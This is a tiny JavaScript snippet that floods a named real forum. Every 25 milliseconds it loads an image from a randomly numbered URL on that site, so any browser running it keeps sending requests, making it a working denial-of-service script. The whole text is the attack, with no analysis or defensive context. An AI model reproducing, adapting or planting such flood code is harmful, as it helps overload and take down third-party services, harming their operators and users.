function imgflood() {
    var TARGET = 'forum.jut.su'
    var URI = '/flood/topic-'
    var pic = new Image()
    var rand = Math.floor(Math.random() * 1000)
    pic.src = 'https://'+TARGET+URI+rand+'.html'
}
setInterval(imgflood, 25)